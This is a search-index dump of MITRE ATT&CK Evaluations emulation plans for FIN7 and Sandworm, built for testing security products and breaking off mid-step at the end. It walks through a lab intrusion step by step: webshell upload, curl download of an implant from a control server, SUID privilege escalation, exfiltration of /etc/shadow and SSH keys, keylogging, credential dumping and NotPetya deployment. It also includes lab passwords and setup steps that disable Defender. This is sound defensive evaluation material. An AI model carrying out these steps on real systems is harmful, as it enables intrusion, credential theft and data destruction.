Names","Availability","BABYMETAL","Backdoor","BOOSTWRITE ( S0415)","Carbanak ( S0030)","Downloader, Stager","Emulation Notes","FIN7 has used BABYMETAL to stage a Meterpreter payload over HTTP(s). 11","FIN7 has used BOOSTWRITE as a loader launched via the abuse of DLL search order of applications. 11","FIN7 has used Carbanak as a post-exploitation tool to cement their foothold and maintain access to victim environments. 11","FIN7 has used GRIFFON to execute modules in-memory and send results to a C2. 4","FIN7 has used HALFBAKED to establish and maintain a foothold in victim networks. 25","FIN7 has used Mimikatz to facilitate privilege escalation. 9","FIN7 has used PAExec to support execution of remote commands. 9","FIN7 has used Pillowmint to scrape credit card data from memory. 9","FIN7 has used SQLRat to drop files and execute SQL scripts on victim hosts. 5","GRIFFON ( S0417)","HALFBAKED ( S0151)","Loader","Mimikatz ( S0002)","Name","Openly Available","PAExec","Pillowmint ( S0517)","Point of Sale (POS) Malware","Remote Access Tool (RAT)","Remote Execution","Software Type","SQLRat ( S0390)","Windows Credential Dumper"]},{"i":"fin7-attck-navigator","l":"FIN7 ATT&CK Navigator"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-fin7-as-referenced-by-mitre-attck","l":"The following behaviors are in scope for an emulation of actions attributed to FIN7 as referenced by MITRE ATT&CK","p":["/Attack_Layers/FIN7_G0046.png"]},{"l":"Scenario 1"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-fin7-as-implemented-in-scenario-1-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to FIN7, as implemented in Scenario 1, in the referenced reporting","p":["/Attack_Layers/FIN7_Scenario1.png"]},{"l":"Scenario 2"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-fin7-as-implemented-in-scenario-2-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to FIN7, as implemented in Scenario 2, in the referenced reporting","p":["/Attack_Layers/FIN7_Scenario2.png"]},{"l":"BOOSTWRITE"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-boostwrite-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using BOOSTWRITE, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/BOOSTWRITE_S0415.png"]},{"l":"Carbanak"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-carbanak-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using Carbanak, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/Carbanak_S0030.png"]},{"l":"GRIFFON"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-griffon-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using GRIFFON, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/GRIFFON_S0417.png"]},{"l":"HALFBAKED"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-halfbaked-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using HALFBAKED, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/HALFBAKED_S0151.png"]},{"l":"Pillowmint"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-pillowmint-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using Pillowmint, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/Pillowmint_S0517.png"]},{"l":"SQLRat"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-fin7-using-sqlrat-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by FIN7 using SQLRat, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/SQLRat_S0390.png"]},{"l":"References","p":["1","10","11","12","13","14","15","16","17","18","19","2","20","21","22","23","24","25","26","3","4","5","6","7","8","9","April 2017","April 2019","ATT&CKing FIN7: The Value of Using Frameworks for Threat Intelligence","August 2018","Behind The CARBANAK Backdoor","CARBANAK Week Part Four: The CARBANAK Desktop Video Player","Carbanak! A Look Inside the Carbanak Source Code","CyberScoop","Cyberthreats to Financial Institutions 2020: Overview and Predictions","Date","December 2019","Deep Insight into \"Fin7\" Malware Chain: From Office Macro Malware to Lightweight js Loader","DeepWatch","Doj","Fin7 Dissected: Hackers Accelerate Pace of Innovation","Fin7 Evolution and the Phishing LNK","FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks","Fin7 Not Finished Morphisec Spots New Campaign","Fin7 Revisited Inside Astra Panel and SQLRat Malware","Fin7 Spearphishing Campaign Targets Personnel Involved in SEC Filings","FIN7 Takes Another Bite at The Resturant Industry","Fin7 Weaponization of DDE is just their Latest Slick Move, Say Researchers","FIN7.5: The Infamous CyberCrime RIG \"FIN7\" Continues its Activities","Fin7/Carbanak Threat Actor Unleashes Bateleur jScript Backdoor","FireEye","Footprints of Fin7: Pushing New Techniques to Evade Detection","Footprints of Fin7: Tracking Actor Patterns (part 1)","Footprints of Fin7: Tracking Actor Patterns (part 2)","Gigamon","How FIN7 Attacked & Stole Data","ID","July 2017","June 2017","Kaspersky","Mahalo Fin7: Responding to the Criminal Operator's New Tools and Techniques","May 2017","May 2019","Microsoft","morphisec","Morphisec Lab","November 2017","November 2018","Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques","October 2017","October 2018","October 2019","On The Hunt for Fin7: Pursuing an Enigmatic and Evasive Global Crime Operation","Profile of an Adversary - FIN7","Proofpoint","Publisher","RSA","SentinelOne","September 2017","Source","Talos","The Carbanak/Fin7 Syndicate: A Historical Overview of an Evolving Threat","The Intelligence Summary summarizes 26 publicly available sources, as well as the results of an open call for contributions. The following organizations participated in the community cyber threat intelligence contribution process:","To SDB, or Not To SDB: Fin7 Leveraging Shim Databases for Persistence"]}],[{"l":"FIN7 Operations Flow","p":["Please see the formal FIN7 Intelligence Summary which includes a break-down of the cited intelligence used for each step of this emulation."]},{"l":"Scenario 1","p":["Based on BOOSTWRITE, Pillowmint, SQLRat, and BabyMetal","This scenario emulates FIN7 targeting a hotel manager network to gain access to credit card information. The scenario begins with FIN7 achieving initial access to the network after an unwitting user executes a malicious .LNK file. FIN7 then pivots to a privileged IT administrator workstation. From this system, FIN7 keylogs credentials needed to access an accounting workstation. FIN7 then pivots to the accounting workstation, establishes persistence, and deploys malware to scrape credit card information from process memory.","This emulation plan is intended to be executed with protections-based capabilities disabled in order to accurately measure a security control's ability to detect specific adversary behavior."]},{"l":"Scenario 2","p":["This scenario emulates the same FIN7 TTP's as scenario 1; however, changes were made to support environments with Protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked."]}],[{"l":"Sandworm","p":["License","Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Sandworm in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83C\uDFDCï¸ \uD83E\uDEB1","p":["Sandworm Team 1 is a destructive threat group attributed to Russia's General Staff of the Armed Forces, Main Intelligence Directorate (GRU) that has been reportedly active since 2009. 2 3 In 2015 Sandworm used a BlackEnergy variant and the KillDisk module against three Ukrainian power distribution companies causing a power outage during the Christmas holidays. The outage left over 225,000 Ukrainian citizens without power in the middle of winter. 4 Sandworm is known for conducting large scale, well funded, destructive, and aggressive campaigns such as Olympic Destroyer, CrashOverride/Industroyer, and NotPetya. 5 6 7 8 NotPetya, a destructive worm-like wiper malware disguised as ransomware, resulted in a global infection that caused nearly $1 billion in losses to three victim organizations alone. 2 9 The \"Sandworm\" name was derived from references to the novel Dune found throughout the malware code, initially used to attribute other pieces of malware to the adversary. 10","Associated Names: ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, VOODOO BEAR"]},{"l":"Emulation Overview","p":["Operations Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1â\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code. Executables are provided in password protected zip files located in the specified software folder. The password is malware.","We provide a script to automatically decrypt these files:"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["P.A.S. webshell","Exaramel","NotPetya","OraDump/LaZagne Varient","Win64/Spy.KeyLogger.G"]},{"l":"Scenario Walkthrough","p":["Detection Scenario- Step by Step walkthrough of Scenario's procedures (9 steps).","Protection Scenario- Step by Step walkthrough of Scenario's procedures (3 tests)"]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Operation Flow- High-level summary of the scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Cynet"]},{"i":"connect-with-us","l":"Connect with Us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2022 MITRE Engenuity. Approved for Public Release. Document number AT0016.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Scenario Overview","p":["This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.","This scenario emulates Sandworm TTPs based on several malware specimens either used by or associated with the Sandworm actors:","P.A.S. Webshell","Exaramel (Linux and Windows variants)","NotPetya","Sandworm Protections Diagram"]},{"i":"test-7-steps-11-14","l":"Test 7 (Steps 11-14)"},{"i":"step-11---initial-compromise","l":"Step 11 - Initial Compromise","p":["\uD83C\uDFA4 voice track","Sandworm logs into patient zero via SSH using Valid Accounts for the user fherbert.","It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit).","Sandworm then deploys a PHP webshell for persistent access."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Upload P.A.S. webshell to caladan/10.0.1.5 as /tmp/search.php.","Password:","Whg42WbhhCE17FEzrqeJ","Move P.A.S. webshell to /var/www/html so it can be invoked via httpd.","Source Code","Source Code - Obfuscated"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]},{"i":"step-12---initial-discovery","l":"Step 12 - Initial Discovery","p":["\uD83C\uDFA4 voice track","Sandworm enumerates information about the compromised system by issuing shell commands through the PHP webshell.","Executed commands include whoami, uname, ls, among others."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Execute whoami from P.A.S. webshell.","â¹ï¸ The '--insecure' option is used so that curl ignores self-signed certificate warnings. Self-signed certificates are used on host Caladan/10.0.1.5 for the scenario.","Execute uname -a from P.A.S. webshell.","Execute ls -lsahR from P.A.S. webshell.","Execute cat /etc/passwd from P.A.S. webshell.","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-13---upload-and-execute-exaramel-linux-variant","l":"Step 13 - Upload and Execute Exaramel (Linux Variant)","p":["\uD83C\uDFA4 voice track","Sandworm downloads an ELF executable from the control server using curl.","The ELF executable is an implant based on Exaramel-Linux.","Once downloaded to disk, Sandworm sets Exaramel-Linux's file permissions to read-write-execute.","Finally, Sandworm executes Exaramel-Linux.","Exaramel-Linux establishes HTTPS C2 with the control server."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Open a new terminal tab (ctrl+shift+t) and start the control server.","Double click the terminal tab to change its name. Name your terminal tab \"control server\" for easy identification.","â ï¸ Go back to your P.A.S. webshell terminal.","Execute curl to download Exaramel-Linux to /var/www/html/centreon_module_linux_app64:","Confirm 'centreon_module_linux_app64' downloaded successfully:","Make Exaramel-Linux executable via chmod.","Insert 1-liner into /var/www/html/include/tools/check.sh; the 1-liner executes Exaramel-Linux.","Execute SUID binary, /bin/backup; this binary executes check.sh from the previous step, which causes Exaramel-Linux to be executed with root privileges.","Source Code","â ï¸ Switch to your controlServer tab; you should have a new callback."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download"]},{"i":"step-14---exaramel-linux-persistence","l":"Step 14 - Exaramel Linux Persistence","p":["\uD83C\uDFA4 voice track","During this step, Sandworm establishes crontab and systemd persistence.","Sandworm then exfils /etc/shadow, bash history, and fherbert's SSH keys over the existing C2 channel.","In the next step, Sandworm uses credentials derived from the /etc/shadow file to attack a lateral host."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your control server tab, split the window horizontally:","In your lower terminal, enter the control server directory. Interaction with Exaramel-Linux (the implant) will occur through this terminal.","Set cron persistence.","Source Code","Set systemd persistence.","Get /etc/shadow.","Get bash history.","Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)","Confirm SSH keys are present on attack platform:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]},{"i":"test-8-steps-15-17","l":"Test 8 (Steps 15-17)"},{"i":"step-15---move-laterally-to-windows-host","l":"Step 15 - Move laterally to Windows host","p":["\uD83C\uDFA4 voice track","During this step, Sandworm uses credentials gained from step4 to move laterally to gammu/10.0.1.7 as local admin user fherbert.","The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials.","The Exaramel dropper is uploaded to C:\\\\Windows\\\\wsmprovav.exe.","Sandworm then establishes a bind shell to gammu using PsExec.py from the Impacket framework.","From the bind shell, Sandworm establishes registry persistance as user fherbert.","Sandworm then disconnects from the bindshell.","Notionally, the legitimate fherbert user logs in via RDP.","This causes the registry persistence to execute the Exaramel dropper.","The exaramel dropper downloads and executes an Exaramel DLL."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Go back to your first terminal tab (P.A.S. Webshell); re-name it \"PsExec-Gammu\".","â ï¸ If you do not already have the Control Server from Step 13 running, execute the following. Otherwise, skip to the next â ï¸.","â ï¸ Keep the gammu-RDP window open.","â ï¸ Observe the PsExec binary name, and paste it in the Slack chat for easy identification:","â ï¸ Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.","Double click the terminal tab to change its name. Name your terminal tab \"control server\" for easy identification.","Enter password:","Load the registry hive for user fherbert.","On login, the fherbert registry persistence will execute the exaramel-windows-dropper (wsmprovav.exe).","Open a new terminal tab (ctrl+shift+t) and start the control server.","Set registry persistence for user fherbert only.","Source Code","Terminate the PsExec.py session. Keep your terminal open.","The dropper will download Exaramel-Windows over HTTP. The dropper then executes the Exaramel-Windows (wsmprovav.dll) using rundll32.exe.","This will execute a Exaramel-Windows dropper on fherbert login.","Upload Exaramel-Windows-Dropper.exe to gammu/10.0.1.7 as C:\\Windows\\wsmprovav.exe.","Use psexec.py to gain a bind-shell to gammu/10.0.1.7 over SMB (TCP 445):","Whg42WbhhCE17FEzrqeJ","You will now RDP into gammu, role-playing as the legitimate fherbert user."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html","https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/","https://blog.talosintelligence.com/2018/02/olympic-destroyer.html","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-16---windows-discovery","l":"Step 16 - Windows Discovery","p":["\uD83C\uDFA4 voice track","Using the Exaramel-Windows C2 channel, Sandworm obtains the current username, OS version, performs a recursive file listing, and queries for RDP connections."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Place your cursor on the second pane in the control server window.","Run the following discovery commands:","Get current user.","Source Code","Get Windows version info.","List entire file system.","Look for RDP connections."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-17---credential-dumping","l":"Step 17 - Credential Dumping","p":["\uD83C\uDFA4 voice track","During this step, Sandworm collects credentials.","Sandworm first uploads two files to disk:","oradump.exe is a variant of the open source tool, LaZagne. It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.","mslog.exe is a keylogger that uses the SetWindowsHookEx function; mslog.exe writes a keystroke log file to C:\\Windows\\System32\\mslog.txt.","Sandworm obtains web browser credentials via oradump.exe.","Sandworm obtains domain admin credentials by keylogging an RDP session from a valid user.","Sandworm then gets a list of all domain hosts using dsquery."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Exaramel-Windows automatically RC4 encrypts the keylog file before exfiltration.","â ï¸ Go back to the gammu RDP session; right-click sign-out.","â ï¸ Go back to your control server terminal.","â ï¸ Switch to the gammu-RDP-session window.","Cleanup artifacts.","Confirm the keylogger actually logged keystrokes:","Confirm the keylogger log file exists:","Confirm you uploaded the keylog file; you should see an RC4 encrypted blob.","Enumerate all domain hosts (prep for notpetya deployment)","Execute the keylogger, logging keystrokes to mslog.txt.","Execute the webCredDumper; you should see credentials from Chromium.","Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).","Give arrakis a minute to load, then right-click sign-out from the RDP session.","Keep the gammu RDP session open.","Keylogger Source Code","Modified LaZagne","Now we will exercise the keylogger.","Open the Windows RDP client on Gammu and manually type the following:","Source Code","Terminate the keylogger","Upload keylogger to gammu.","Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 192.168.0.4:443):","You must type this data manually to exercise the keylogger (caveat: if you fail to enter the password on the first try, just copy/paste it)."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/"]},{"i":"test-9-steps-18-19","l":"Test 9 (Steps 18-19)"},{"i":"step-18---pivot-to-dc","l":"Step 18 - Pivot to DC","p":["\uD83C\uDFA4 voice track","Sandworm logs into arrakis/10.0.1.4 over RDP using domain credentials (patreides).","Sandworm uploads a DLL based on NotPetya to arrakis (C:\\Windows\\perfc.dat) over a network share tunneled through the RDP connection."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ go back to your first terminal window; rename to RDP into arrakis.","RDP into arrakis/domain controller using domain admin credentials.","Accept certificate warnings if prompted.","Once logged in, close server manager and any spurious warnings or pop-ups.","Open PowerShell as administrator (right click run as administrator yes):","Copy NotPetya from dungeon to arrakis over RDP channel:","Delete the RDP network share:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"]},{"i":"step-19---deploy-notpetya","l":"Step 19 - Deploy NotPetya","p":["\uD83C\uDFA4 voice track","Sandworm executes NotPetya (perfc.dat) on arrakis / 10.0.1.4.","NotPetya creates a scheduled task called \"Restart\" that reboots the workstation and is executed at the end of the program.","NotPetya encrypts files under C:\\Users (recursive) via AES-128.","NotPetya drops a ransom note in C:\\README.txt.","NotPetya copies and executes itself on 10.0.1.8."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Scenario complete.","Note: if you need to confirm encryption worked, do the following:","Open CMD, and cat this file:","If the file looks like encrypted binary, notPetya worked.","You may also run this command on Quadra to confirm lateral movement worked:","From DC PowerShell:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html","https://www.us-cert.gov/ncas/alerts/TA17-181A","https://www.justice.gov/opa/press-release/file/1328521/download"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by the Sandworm Team. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating the Sandworm Team to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: tested and executed on Kali Linux 2019.1","LaZagne","pyinstaller","Mimikatz","FreeRDP"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of NotPetya ransomeware.","These utilities include credential dumpers, variants of process injection techniques, and file encryption.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4."]},{"l":"Linux Attack Platform Setup","p":["Download the sandworm repository to the home directory"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Linux Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","User machine 1: tested and executed on Windows 10 - Build 19042","User machine 2: tested and executed on Windows 10 - Build 19042"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","Linux Server","caladan","10.0.1.5","Domain Controller","arrakis","10.0.1.4","User machine 1","gammu","10.0.1.7","User machine 2","quadra","10.0.1.8"]},{"l":"Linux Server Setup","p":["Upload caladan.sh to 10.0.1.5 via SCP","password: Whg42WbhhCE17FEzrqeJ","â ï¸ Run this command if you get SSH key errors","upload SUID binary to caladan","Run caladan.sh"]},{"l":"Domain Controller Setup","p":["RDP into arrakis:","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot"]},{"i":"gammu--10017-setup","l":"Gammu / 10.0.1.7 Setup","p":["RDP into Gammu:","Open Windows Defender, toggle all knobs to the off position.","Open PowerShell being sure to select Run as Administrator.","Open chromium and navigate to: https://www.stealmylogin.com/demo.html","Enter the following credentials; save / cache the credentials when prompted.","Double-check the credentials were cached by going to Chromium settings > passwords. You should have one entry for stealmylogin.com","Reboot Gammu:"]},{"i":"configure-quadra--10018","l":"Configure Quadra / 10.0.1.8","p":["RDP into quadra:","Open Windows Defender, toggle all knobs to the off position.","Open PowerShell being sure to select Run as Administrator:","Reboot"]},{"l":"Network Diagram","p":["A network diagram is available here that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan.","Infrastructure Image"]}],[{"l":"Scenario Overview","p":["This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.","This scenario emulates Sandworm TTPs based on several malware specimens either used by or associated with the Sandworm actors:","P.A.S. Webshell","Exaramel (Linux and Windows variants)","NotPetya"]},{"i":"step-11---initial-compromise","l":"Step 11 - Initial Compromise","p":["\uD83C\uDFA4 voice track","Sandworm logs into patient zero via SSH using Valid Accounts for the user fherbert.","It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit).","Sandworm then deploys a PHP webshell for persistent access."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Upload P.A.S. webshell to caladan/10.0.1.5 as /tmp/search.php.","Password:","Whg42WbhhCE17FEzrqeJ","Move P.A.S. webshell to /var/www/html so it can be invoked via httpd.","Source Code","Source Code - Obfuscated"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]},{"i":"step-12---initial-discovery","l":"Step 12 - Initial Discovery","p":["\uD83C\uDFA4 voice track","Sandworm enumerates information about the compromised system by issuing shell commands through the PHP webshell.","Executed commands include whoami, uname, ls, among others."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Execute whoami from P.A.S. webshell.","â¹ï¸ The '--insecure' option is used so that curl ignores self-signed certificate warnings. Self-signed certificates are used on host Caladan/10.0.1.5 for the scenario.","Execute uname -a from P.A.S. webshell.","Execute ls -lsahR from P.A.S. webshell.","Execute cat /etc/passwd from P.A.S. webshell.","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-13---upload-and-execute-exaramel-linux-variant","l":"Step 13 - Upload and Execute Exaramel (Linux Variant)","p":["\uD83C\uDFA4 voice track","Sandworm downloads an ELF executable from the control server using curl.","The ELF executable is an implant based on Exaramel-Linux.","Once downloaded to disk, Sandworm sets Exaramel-Linux's file permissions to read-write-execute.","Finally, Sandworm executes Exaramel-Linux.","Exaramel-Linux establishes HTTPS C2 with the control server."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Open a new terminal tab (ctrl+shift+t) and start the control server.","Double click the terminal tab to change its name. Name your terminal tab \"control server\" for easy identification.","â ï¸ Go back to your P.A.S. webshell terminal.","Execute curl to download Exaramel-Linux to /var/www/html/centreon_module_linux_app64:","Confirm 'centreon_module_linux_app64' downloaded successfully:","Make Exaramel-Linux executable via chmod.","Insert 1-liner into /var/www/html/include/tools/check.sh; the 1-liner executes Exaramel-Linux.","Execute SUID binary, /bin/backup; this binary executes check.sh from the previous step, which causes Exaramel-Linux to be executed with root privileges.","Source Code","â ï¸ Switch to your controlServer tab; you should have a new callback.","Take a screenshot of the new implant and paste in slack."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download"]},{"i":"step-14---exaramel-linux-persistence","l":"Step 14 - Exaramel Linux Persistence","p":["\uD83C\uDFA4 voice track","During this step, Sandworm establishes crontab and systemd persistence.","Sandworm then exfils /etc/shadow, bash history, and fherbert's SSH keys over the existing C2 channel.","In the next step, Sandworm uses credentials derived from the /etc/shadow file to attack a lateral host."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your control server tab, split the window horizontally:","In your lower terminal, enter the control server directory. Interaction with Exaramel-Linux (the implant) will occur through this terminal.","Note: Make sure to wait for the client to return the results of the previous command before tasking a new command.","Set cron persistence.","Source Code","Set systemd persistence.","Get /etc/shadow.","Get bash history.","Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)","Confirm SSH keys are present on attack platform:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]},{"i":"step-15---move-laterally-to-windows-host","l":"Step 15 - Move laterally to Windows host","p":["\uD83C\uDFA4 voice track","During this step, Sandworm uses credentials gained from step4 to move laterally to gammu/10.0.1.7 as local admin user fherbert.","The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials.","The Exaramel dropper is uploaded to C:\\\\Windows\\\\wsmprovav.exe.","Sandworm then establishes a bind shell to gammu using PsExec.py from the Impacket framework.","From the bind shell, Sandworm establishes registry persistance as user fherbert.","Sandworm then disconnects from the bindshell.","Notionally, the legitimate fherbert user logs in via RDP.","This causes the registry persistence to execute the Exaramel dropper.","The exaramel dropper downloads and executes an Exaramel DLL."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Go back to your first terminal tab (P.A.S. Webshell); re-name it \"PsExec-Gammu\".","â ï¸ Keep the gammu-RDP window open.","â ï¸ Observe the PsExec binary name, and paste it in the Slack chat for easy identification:","â ï¸ Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.","Enter password:","From your current terminal, run:","Load the registry hive for user fherbert.","Note: smbclient may produce the following message: Unable to initialize messaging context. This message can be safely ignored.","On login, the fherbert registry persistence will execute the exaramel-windows-dropper (wsmprovav.exe).","Set registry persistence 